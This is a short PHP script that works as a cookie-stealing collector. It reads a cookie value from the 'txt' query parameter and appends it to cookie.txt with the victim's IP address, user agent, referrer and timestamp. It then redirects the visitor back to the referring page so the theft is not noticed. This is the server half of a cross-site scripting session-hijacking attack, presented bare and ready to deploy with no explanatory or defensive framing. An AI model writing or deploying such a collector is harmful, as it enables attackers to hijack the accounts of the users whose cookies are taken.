<?php
declare(strict_types=1);

date_default_timezone_set('UTC');

$cookie = $_GET['txt'] ?? '';
if ($cookie === '') {
    $referer = $_SERVER['HTTP_REFERER'] ?? '/';
    header('Location: ' . $referer);
    exit;
}

$safe_cookie = preg_replace('/[^\x20-\x7E]/', '', substr($cookie, 0, 4096));
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'none';
$date = date('Y-m-d H:i:s');

$log = "cookie = $safe_cookie\n";
$log .= "ip = $ip\n";
$log .= "agent = $agent\n";
$log .= "date = $date\n";
$log .= "referrer = $referrer\n";
$log .= "=======\n";

file_put_contents('cookie.txt', $log, FILE_APPEND | LOCK_EX);

header('Location: ' . $referrer);
